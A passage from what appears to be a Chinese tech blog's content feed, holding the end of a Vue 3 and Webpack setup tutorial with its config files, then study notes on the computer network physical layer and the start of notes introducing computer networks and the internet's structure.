class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>创建<code>env.d.ts</code></p> <figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&quot;*.vue&quot;</span> &#123;</span><br><span class="line">  <span class="keyword">import</span> &#123; <span class="title class_">DefineComponent</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">component</span>: <span class="title class_">DefineComponent</span>&lt;&#123;&#125;, &#123;&#125;, <span class="built_in">any</span>&gt;;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">default</span> component;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>创建<code>.babelrc</code></p> <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;presets&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;@babel/env&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;plugins&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="项目配置-2">项目配置</h3><ol><li><p>修改<code>package.json</code>中<code>scripts</code>如下：</p> <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack-dev-server&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure></li><li><p>创建<code>webpack.config.js</code>，写入如下内容：</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> htmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">VueLoaderPlugin</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;vue-loader/dist/index&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">CleanWebpackPlugin</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;clean-webpack-plugin&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Configuration</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">MiniCssExtractPlugin</span> = <span class="built_in">require</span>(<span class="string">&quot;mini-css-extract-plugin&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cssMinimizer = <span class="built_in">require</span>(<span class="string">&quot;css-minimizer-webpack-plugin&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@type</span> &#123;<span class="type"> Configuration </span>&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="comment">// 可选模式： development / production</span></span><br><span class="line">    <span class="attr">mode</span>: <span class="string">&#x27;development&#x27;</span>,</span><br><span class="line">    <span class="attr">entry</span>: <span class="string">&#x27;./src/main.ts&#x27;</span>,</span><br><span class="line">    <span class="attr">output</span>: &#123;</span><br><span class="line">        <span class="attr">filename</span>: <span class="string">&#x27;[name].js&#x27;</span>,</span><br><span class="line">        <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./dist&#x27;</span>),</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">module</span>: &#123;</span><br><span class="line">        <span class="attr">rules</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">test</span>: <span class="regexp">/\.vue$/</span>,</span><br><span class="line">                <span class="attr">use</span>: <span class="string">&#x27;vue-loader&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">test</span>: <span class="regexp">/\.css$/</span>,</span><br><span class="line">                <span class="attr">use</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">loader</span>: <span class="title class_">MiniCssExtractPlugin</span>.<span class="property">loader</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;css-loader&quot;</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">test</span>: <span class="regexp">/\.ts$/</span>,</span><br><span class="line">                <span class="attr">loader</span>: <span class="string">&quot;ts-loader&quot;</span>,</span><br><span class="line">                <span class="attr">exclude</span>: <span class="regexp">/node_modules/</span>,</span><br><span class="line">                <span class="attr">options</span>: &#123;</span><br><span class="line">                    <span class="attr">appendTsSuffixTo</span>: [<span class="regexp">/\.vue$/</span>]</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">test</span>: <span class="regexp">/\.js$/</span>,</span><br><span class="line">                <span class="attr">use</span>: [<span class="string">&#x27;babel-loader&#x27;</span>],</span><br><span class="line">                <span class="attr">include</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">            &#125;,</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">plugins</span>: [</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">htmlWebpackPlugin</span>(&#123;</span><br><span class="line">            <span class="attr">template</span>: <span class="string">&#x27;./public/index.html&#x27;</span></span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">VueLoaderPlugin</span>(),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">CleanWebpackPlugin</span>(),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">MiniCssExtractPlugin</span>(&#123;</span><br><span class="line">            <span class="attr">filename</span>: <span class="string">&quot;main.css&quot;</span>,</span><br><span class="line">            <span class="attr">chunkFilename</span>: <span class="string">&quot;[id].css&quot;</span></span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">cssMinimizer</span>()</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">devServer</span>: &#123;</span><br><span class="line">        <span class="attr">compress</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">port</span>: <span class="number">8000</span>,</span><br><span class="line">        <span class="attr">hot</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">open</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">resolve</span>: &#123;</span><br><span class="line">        <span class="attr">alias</span>: &#123;</span><br><span class="line">            <span class="string">&quot;@&quot;</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./src&#x27;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">extensions</span>: [<span class="string">&#x27;.vue&#x27;</span>, <span class="string">&#x27;.ts&#x27;</span>, <span class="string">&#x27;.js&#x27;</span>, <span class="string">&#x27;.json&#x27;</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">externals</span>: &#123;</span><br><span class="line">        <span class="attr">vue</span>: <span class="string">&#x27;Vue&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// stats: &quot;errors-only&quot;,</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Webpack </category>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webpack </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络的物理层</title>
      <link href="/posts/81932b36.html"/>
      <url>/posts/81932b36.html</url>
      
        <content type="html"><![CDATA[<h2 id="物理层的基本概念">物理层的基本概念</h2><ul><li>物理层考虑的是怎样才能在连接各种计算机的传输媒体上传输数据比特流，而不是指具体的传输媒体。其作用是要尽可能地屏蔽掉不同传输媒体和通信手段的差异。用于物理层的协议也常称为物理层<strong>规程</strong>（procedure)。</li><li>物理层的四个特性：<ol><li><strong>机械特性</strong>：对接口接线器规格的规定（形状、尺寸、引脚数目……）</li><li><strong>电气特性</strong>：接口电缆上各条线的电压范围</li><li><strong>功能特性</strong>：指明某一条线上出现某一电平的电压的意义</li><li><strong>过程特性</strong>：对于不同功能的各种可能事件的出现顺序</li></ol></li></ul><h2 id="数据通信的基础知识🌟">数据通信的基础知识🌟</h2><h4 id="数据通信系统的模型">数据通信系统的模型</h4><ul><li><p>一个数据通信系统可划分为三大部分：</p><ul><li>源系统（发送端、发送方），包括：<ul><li>源点（source）：远点设备产生要传输的数据</li><li>发送器：将数字比特流编码以在传输系统传输的部分，如调制器</li></ul></li><li>传输系统（传输网络）</li><li>目的系统（接收端、接收方），包括：<ul><li>接收器：将接收到的信号转换为可以被目的设备处理的信息，如解调器</li><li>终点（destination）（目的站、信宿）：重点设备从接收器获取传送来的数字比特流，然后输出信息</li></ul></li></ul><p><img src="https://oss.iuoyt.com/img/posts/image-20240324154950366.png" alt="数据通信系统的模型"></p></li><li><p><strong>数据</strong>（data）式运送消息的实体。<strong>信号</strong>（signal）则是数据的电气或电磁的表现，按照参数的取值方式不同分为两大类：</p><ul><li>模拟信号（连续信号）：消息的参数取值是连续的，可采用电波形式表示，特点为波动性、持续变化、包含无穷多个值。</li><li>数字信号（离散信号）：消息的参数取值是离散的，特点为离散型、跃变性、包含有限个值、设备性能先进、较为便宜。</li></ul><p><img src="https://oss.iuoyt.com/img/posts/image-20240324155112243.png" alt="模拟信号和数字信号的波形比较"></p></li><li><p>在使用时间域的波形表示数字信号时，代表不同离散数值的基本波形称为<strong>码元</strong>。</p><p><img src="https://oss.iuoyt.com/img/posts/1711266783120.jpg" alt="码元与信息比特"></p></li><li><p>模拟信道与数字信道：</p><ul><li><strong>模拟信道</strong>是用来传输连续的模拟信号的信道，如果利用模拟信道传送数字数据，则必须经过数字与模拟信号之间的变换（A/D变换器）。</li><li><strong>数字信道</strong>是用来传输离散的数字信号（如脉冲信号）的信道</li></ul></li></ul><h4 id="数据传输的几种形式">数据传输的几种形式</h4><ul><li><p>模拟数据和数字数据之间都可以用模拟信号或数字信号来表示，可以用其中任意一种形式传输。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240324155430823.png" alt="传输形式的转换"></p></li></ul><h4 id="信道的基本概念">信道的基本概念</h4><ul><li><p><strong>信道</strong>表示向某一个方向传送信息的媒体。根据通信双方信息交互方式来看，有如下三种基本方式：</p><ul><li>单向通信（单工通信）：只能有一个方向的通信而没有反方向的交互。</li><li>双向交替通信（半双工通信）：通信双方都可以大宋信息，但不能双方同时发送。</li><li>双向同时通信（全双工通信）：通信双方可以同时发送和接收信息</li></ul></li><li><p><strong>基带信号</strong>（基本频带信号）：来自信源的信号。像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号。基带信号往往包含有较多的低频成分，甚至有直流成分，而<strong>许多信道并不能传输这种低频分量或直流分量</strong>。因此必须对基带信号进行<strong>调制</strong>  (modulation)。调制分为两类：</p><ul><li><strong>基带调制</strong>：仅对基带信号的波形进行变换，使它能够与信道特性相适应。变换后的信号仍然是基带信号。把这种过程称为编码 (coding)。</li><li><strong>带通调制</strong>：使用载波 (carrier)进行调制，把基带信号的频率范围搬移到较高的频段，并转换为模拟信号，这样就能够更好地在模拟信道中传输（即仅在一段频率范围内能够通过信道） 。</li></ul><p><img src="https://oss.iuoyt.com/img/posts/image-20240324161429461.png" alt="基带调制与带通调试"></p></li><li><p>常用的数字信号编码技术：</p><ul><li>不归零制：正电平代表 1，负电平代表 0。</li><li>归零制：正脉冲代表 1，负脉冲代表 0。</li><li>曼彻斯特编码：位周期中心的向上跳变代表 0，位周期中心的向下跳变代表 1。但也可反过来定义。（IEEE 802.3以太局域网标准编码）</li><li>差分曼彻斯特编码：在每一位的中心处始终都有跳变。位开始边界有跳变代表 0，而位开始边界没有跳变代表 1。（IEEE 802.5令牌环局域网标准编码）</li></ul><p><img src="https://oss.iuoyt.com/img/posts/image-20240324160652163.png" alt="常用编码方式"></p><p>每个码元中间都要发生跳变，接收端可将此变化提取出来作为同步信号，使接收端的时钟与发送设备的时钟保持一致。曼彻斯特编码也称为自同步码（即有<strong>自同步能力</strong>）。</p></li><li><p>基本的带通调制方法</p><ul><li>调幅(AM)：载波的振幅随基带数字信号而变化。</li><li>调频(FM)：载波的频率随基带数字信号而变化。</li><li>调相(PM) ：载波的初始相位随基带数字信号而变化。</li></ul><p><img src="https://oss.iuoyt.com/img/posts/1711267850240.jpg" alt="带通调制方法"></p></li><li><p>脉冲编码调制（PCM）解调技术三步骤：</p><ul><li>采样：按一定间隔对语音信号进行采样</li><li>量化：对每个样本舍入到量化级别上</li><li>编码：对每个舍入后的样本进行编码</li></ul></li></ul><h3 id="信道的极限容量">信道的极限容量</h3><h4 id="信道能够通过的频率范围">信道能够通过的频率范围</h4><ul><li><p>从概念上讲，限制码元在信道上的传输速率的因素有以下两个：</p><ul><li>信道能够通过的频率范围</li><li>信噪比</li></ul></li><li><p>理想低通信道的最高码元传输速率B = 2W Baud（W是理想低通信道的带宽，单位为赫(Hz)，Baud 是波特，是码元传输速率的单位，1波特为每秒传送1个码元。）</p></li><li><p>数据传输速率：$C=2W\log_{2}{V}(bps)$</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240324161710880.png" alt="理想低通信道的极限数据传输率"></p></li><li><p>码元传输速率B与信息传输速率C的关系：$C=B\times \log_{2}{V}(bps)$​</p></li></ul><h4 id="信噪比">信噪比</h4><ul><li>信噪比就是信号的平均功率和噪声的平均功率之比。常记为S/N，并用分贝 (dB) 作为度量单位。即：$信噪比=10\log_{10}{(S/N)}(dB)$​</li><li>带宽受限且有高斯白噪声干扰的信道的极限、无差错的信息传输速率（香农公式）：$C=W\log_{2}{(1+S/N)}(bps)$。（其中：W 为信道的带宽（以 Hz 为单位），S 为信道内所传信号的平均功率，N 为信道内部的高斯噪声功率 ）。</li></ul><h2 id="物理层下面的传输媒体🌟">物理层下面的传输媒体🌟</h2><ul><li><p>传输媒体（传输介质、传输媒介）：数据传输系统中在发送器和接收器之间的物理通路，是通信中实际传输信息的载体。传输媒体分为两大类：</p><ul><li>导引型传输媒体：电磁波被导引沿着固体媒体（铜线或光纤）传播。</li><li>非导引型传输媒体：即自由空间。在非导引型传输媒体中，电磁波的传输常称为无线传输。</li></ul><p><img src="https://oss.iuoyt.com/img/posts/1711283357948.jpg" alt="电信领域使用的电磁波的频谱"></p></li></ul><h3 id="导引型传输媒体">导引型传输媒体</h3><h4 id="双绞线">双绞线</h4><ul><li><p>最常用的传输媒体。模拟传输和数字传输都可以使用双绞线，其通信距离一般为几到十几公里。分为<strong>屏蔽双绞线 STP</strong> (Shielded Twisted Pair)和<strong>无屏蔽双绞线 UTP</strong>  (Unshielded Twisted Pair) 两种。</p><p><img src="https://oss.iuoyt.com/img/posts/1711284278292.jpg" alt="双绞线"></p></li></ul><h4 id="同轴电缆">同轴电缆</h4><ul><li><p>同轴电缆具有很好的抗干扰特性，被广泛用于传输较高速率的数据。同轴电缆的带宽取决于电缆的质量。</p><ul><li>50 Ω 同轴电缆 —— LAN / 数字传输常用</li><li>75 Ω 同轴电缆 —— 有线电视 / 模拟传输常用</li></ul>  <img src="https://oss.iuoyt.com/img/posts/image-20240324204830611.png" alt="同轴电缆" style="zoom:50%;" /></li><li><p>50Ω同轴电缆又分为<strong>粗缆</strong>和<strong>细缆</strong>两种。</p><ul><li><p>粗缆传输性能优于细缆。常用于10Base-5的以太网中，单根最大传输距离500米。（10：传输速率10Mbps，base：基带传输，5：最大网段长度500m）</p><ul><li>总线上最多可以连接100个收发器，两个收发器之间的距离不能小于2.5m</li><li>收发器电缆（AUI电缆）长度最多为50m</li><li>物理连接遵循5-4-3规则：最多可用4个中继器，5个网段（其中仅3个网段可接工作站，其余只用于距离加长），最大网络长度2469米。</li></ul><p><img src="https://oss.iuoyt.com/img/posts/image-20240324205243478.png" alt="粗缆以太网"></p></li><li><p>而细缆常用于10Base-2的以太网中，单根最大传输距离185米。</p></li></ul></li></ul><h4 id="光缆">光缆</h4><ul><li><p>由于可见光的频率非常高，约为 $10^8$​ MHz 的量级，因此一个光纤通信系统的传输带宽远远大于目前其他各种传输媒体的带宽。</p><p><img src="https://oss.iuoyt.com/img/posts/1711284886036.jpg" alt="光纤"></p><p>当光线从高折射率的媒体射向低折射率的媒体时，其折射角将大于入射角。因此，如果入射角足够大，就会出现全反射，光也就沿着光纤传输下去。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240324205629662.png" alt="光波在纤芯中的传播"></p><p>只要从纤芯中射到纤芯表面的光线的入射角大于某个临界角度，就可产生全反射。</p></li><li><p>多模光纤与单模光纤</p><ul><li>多模光纤可以存在多条不同角度入射的光线在一条光纤中传输。</li><li>单模光纤的直径减小到只有一个光的波长，像一根波导那样使光线一直向前传播，而不会产生多次反射。</li></ul><p><img src="https://oss.iuoyt.com/img/posts/1711285131323.jpg" alt="多模光纤与单模光纤"></p></li><li><p>光纤的优点</p><ul><li>通信容量非常大。</li><li>传输损耗小，中继距离长。</li><li>抗雷电和电磁干扰性能好。</li><li>无串音干扰，保密性好。</li><li>体积小，重量轻。</li></ul></li></ul><h3 id="非导引型传输媒体">非导引型传输媒体</h3><ul><li>无线传输所使用的频段很广。短波通信（即高频通信）主要是靠电离层的反射，但短波信道的通信质量较差，传输速率低。</li><li>地面微波接力通信<ul><li>原理：<ul><li>在两个微波传送塔之间传输信息（视距传输）。</li><li>通过微波中继站串联使用完成远距离传输。</li></ul></li><li>优点：频带宽、通信容量大、传输质量高、可靠性较好、投资少、见效快、灵活</li><li>缺点：相邻站间必须直视，不能有障碍物；受气候干扰较大、保密性差、中继站的使用与维护问题等。</li></ul></li></ul><h2 id="信道复用技术🌟">信道复用技术🌟</h2><ul><li><strong>频分多路复用FDM</strong> (Frequency Division Multiplexing)，适合于<u>模拟信号的传输</u>，如电话系统、电视系统。</li><li><strong>时分多路复用TDM</strong>(Time Division Multiplexing)，适用于<u>数字信号的传输</u>，计算机网络中的数据突发性，应用异步时分多路复用技术</li><li><strong>波分多路复用WDM</strong> (Wave Division Multiplexing) ，应用于<u>全光纤组成的网络中</u>，传输的是光信号</li><li><strong>码分多路复用CDM</strong>(Code Division Multiplexing)，广泛应用于<u>移动通信和无线局域网</u>中</li></ul><h3 id="频分复用FDM">频分复用FDM</h3><ul><li>将整个带宽分为多份，用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。</li><li>频分复用的所有用户在同样的时间占用不同的带宽资源（频率带宽）。</li></ul><img src="https://oss.iuoyt.com/img/posts/image-20240414161226925.png" alt="频分复用" style="zoom:50%;" /><h3 id="时分复用TDM">时分复用TDM</h3><ul><li>时分复用则是将时间划分为一段段等长的时分复用帧（TDM帧）。每一个时分复用的用户在每一个 TDM 帧中占用固定序号的时隙，所有用户在不同的时间占用同样的频带宽度。</li><li>TDM 信号也称为等时 (isochronous) 信号。</li></ul><img src="https://oss.iuoyt.com/img/posts/image-20240414161509993.png" alt="时分复用" style="zoom:50%;" /><h3 id="统计时分复用STDM">统计时分复用STDM</h3><ul><li>按需动态地分配时隙。因此统计时分复用可以提高线路的利用率。</li></ul><img src="https://oss.iuoyt.com/img/posts/image-20240414162413297.png" alt="image-20240414162413297" style="zoom:50%;" /><h3 id="波分复用WDM">波分复用WDM</h3><ul><li>波分复用就是光的频分复用。使用一根光纤来同时传输多个光载波信号。</li></ul><p><img src="https://oss.iuoyt.com/img/posts/image-20240414162514034.png" alt="波分复用"></p><h3 id="码分复用CDM">码分复用CDM</h3><ul><li>码分复用让每一个用户在同样的时间，使用同样的频带进行通信，各用户使用经过特殊挑选的不同码型（码分多址 CDMA (Code Division Multiple Access)），因此彼此不会造成干扰。</li><li>这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现。</li><li>每一个比特时间划分为 m 个短的间隔，即“码片”，使用CDMA的每一个站被指派一个唯一的m bit码片序列，一般是64或128。如发送比特1，则发送码片系列，发送0则发送码片序列的二进制反码。</li></ul><div class="note info flat"><p>内容更新中……</p></div><h2 id="数字传输系统">数字传输系统</h2><h2 id="宽带接入技术">宽带接入技术</h2><h3 id="ADSL技术">ADSL技术</h3><h3 id="光纤同轴混合网（HFC网）">光纤同轴混合网（HFC网）</h3><h3 id="FTTx技术">FTTx技术</h3>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络概述</title>
      <link href="/posts/7c4ca347.html"/>
      <url>/posts/7c4ca347.html</url>
      
        <content type="html"><![CDATA[<p>最早有三类网络：电信网络、有线电视网络和计算机网络，后来“三网融合”，将三种网络融合成一种网络就可以提供上述的所有服务。</p><h2 id="互联网概述">互联网概述</h2><h3 id="两个基本特点">两个基本特点</h3><ul><li>互联网有两个重要的基本特点，即<strong>连通性</strong>和<strong>共享</strong>。<ul><li>连通性：用户之间不论相距都远的距离，通过互联网都可以便捷地、经济地交换各种信息。</li><li>共享：也就是资源共享，可以是信息共享、软件共享或者是硬件共享。这些资源就好像在用户身边一样，使用非常方便。</li></ul></li></ul><h3 id="计算机网络">计算机网络</h3><ul><li><p>计算机网络由若干<strong>节点</strong>（node）和连接这些节点的<strong>链路</strong>（link）构成，节点可以是计算机、集线器、交换机、路由器等。所谓互联网也就是将各部分计算机网络连接起来，形成一张更大的网络，即“网络的网络”。</p><p><img src="https://oss.iuoyt.com/img/posts/1709786375427.jpg" alt="1709786375427"></p></li><li><p>网络把计算机连接在一起，而互联网则把许多网络通过路由器连接在一起。与网络相连的计算机常称为主机（host）。</p></li></ul><h3 id="互联网基础结构发展的三个阶段">互联网基础结构发展的三个阶段</h3><ul><li><p>第一阶段：从单个网络ARPANET向互联网发展的过程。</p><p>1969年美国国防部创建的第一个分组交换网ARPANET最初只是一个单个的分组交换网，各主机都直接与就近的节点交换机相连。后来逐渐应用在民用技术上，互联网络由此出现，成为现今互联网的雏形。</p></li><li><p>第二阶段：建成了三级结构的互联网。</p><p>1985年，美国国家科学基金会NSF围绕六个大型计算机中心建设计算机网络，由三级构成，分别为主干网、地区网和校园网（或企业网），这个网络覆盖了美国主要的大学和研究所。1991年，NSF和其他政府机构认为互联网不应只限于大学和研究机构，于是允许众多公司接入互联网，网络上的信息量急剧增大，使互联网的容量已无法满足需要，政府决定将互联网主干网交给私人公司经营，并开始收费。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240307124029897.png" alt="三级结构"></p></li><li><p>第三阶段：逐渐形成了全球范围的多层次ISP结构的互联网。</p><p>从1993年开始，由美国政府自主的NSFNET逐渐被若干个商用的互联网主干网替代，由此出现了<strong>互联网服务提供者ISP</strong>（Internet Service Provider），例如我国的中国电信、中国联通和中国移动。ISP可以从互联网管理机构申请到很多IP地址，同时拥有通信线路和路由器等联网设备，因此任何个人或机构向ISP缴纳规定费用，就可以从ISP获取到IP地址和租用权，并通过ISP接入互联网。</p></li></ul><h3 id="互联网服务提供者层次">互联网服务提供者层次</h3><ul><li><p>互联网服务提供者ISP也分为多个层次，主干ISP、地区ISP和本地ISP，目前覆盖全世界的互联网，主干ISP只有十几个，但本地ISP数量达到几十万个。</p><ul><li>主干ISP：由特定公司创建和维护，服务面积最大（一般覆盖国家范围），并且拥有高速主干网。不同网络运营商都有自己的主干ISP网络，并且可以彼此互通。</li><li>地区ISP：这些地区ISP通过主干ISP连接起来，数据率也比主干ISP低一些。</li><li>本地ISP：给用户提供直接的服务，可以连接到地区ISP，也可以直接连接到主干ISP。可以是提供互联网服务的公司，或是向内部提供服务的企业，或是运行自己网络的非营利机构（比如学校）。</li></ul></li><li><p>随着互联网数据的急剧增长，以及为了给主干ISP减轻转发分组的压力和提高转发效率，<strong>互联网交换点IXP</strong>（Internet eXchange Point）应运而生。其作用是：允许两个网络直接相连并交换分组，而不需要再通过第三个网络来转发分组，由此，转发分组不必再经过最上层的主干ISP，而是直接在两个地区ISP之间用高速链路对等地交换分组。</p><p><img src="https://oss.iuoyt.com/img/posts/1709786452810.jpg" alt="基于ISP的多层结构的互联网的概念示意图"></p><p>两个主机的信息传递方式：主机A→本地ISP→地区ISP→主干ISP→地区ISP→本地ISP→主机B</p></li></ul><h3 id="互联网标准化">互联网标准化</h3><ul><li>1992年后成立了一个国际性组织互联网协会ISOC（Internet Society）来对互联网进行全面管理以及在世界范围内促进起发展和使用。</li><li>所有的互联网标准都是以RFC（Request For Comments，“请求评论”）的形式在互联网上发表的，指定互联网的正式标准要经过三个阶段：<ul><li>互联网草案（Internet Draft）：六个月有效期，但不算是RFC文档</li><li>建议标准（Proposed Standard）：开始成为RFC文档</li><li>互联网标准（Internet Standard）：如果经过长期的检验，证明某个检疫标准可以成为互联网标准，则为其分配一个标准编号</li></ul></li></ul><h2 id="互联网的组成🌟">互联网的组成🌟</h2><ul><li><p>互联网从工作方式上看可以分为两大模块，边缘部分和核心部分。其核心功能是分组转发。</p><p><img src="https://oss.iuoyt.com/img/posts/1709786671415.jpg" alt="互联网的组成部分"></p></li></ul><h3 id="边缘部分">边缘部分</h3><ul><li><p>边缘部分由所有连接在互联网上的主机（端系统）组成，这部分是用户直接使用的，用来进行通信（传输数据、音频或视频）和资源共享。端系统可以是个人电脑、智能手机、网络摄像头，或者是大型计算机（服务器），拥有者可以是个人或者单位，或者也可以属于某一ISP。</p></li><li><p>端系统之间的通信方式有两大类：</p><ul><li><p>客户-服务器方式（C/S方式）</p><p>互联网上最常用、最传统的方式，<strong>客户（client）是服务请求方，服务器（server）是服务提供方</strong>。</p><p><img src="https://oss.iuoyt.com/img/posts/1709786715452.jpg" alt="客户-服务器方式"></p></li><li><p>对等连接方式（P2P方式）</p><p>对等连接（peer-to-peer）的两台主机通过对等连接软件就可以进行平等的对等连接通信，双方都可以下载对方已经存储在硬盘中的共享文档。这一种连接方式中，<strong>每一台主机既是客户又是服务器</strong>。</p><p><img src="https://oss.iuoyt.com/img/posts/1709786751324.jpg" alt="对等连接方式"></p></li></ul></li></ul><h3 id="核心部分">核心部分</h3><ul><li>核心部分由大量网络和链接这些网络的路由器组成，这部分是为边缘部分提供服务的（提供连通性和交换），使得边缘部分中的任何一台主机都能与其他主机通信。</li><li><strong>网络核心部分起特殊作用的是路由器（router）</strong>，是一种专用计算机，是<strong>实现分组交换（packet switching）的关键构件</strong>，任务是转发收到的分组。路由器和边缘部分的主机有很大不同，主机是为用户进行信息处理的，路由器则是用来转发分组，即进行分组交换。<strong>分组转发是网络核心部分最重要的功能</strong>。</li><li>典型的交换技术包括：电路交换、分组交换和报文交换。</li></ul><h4 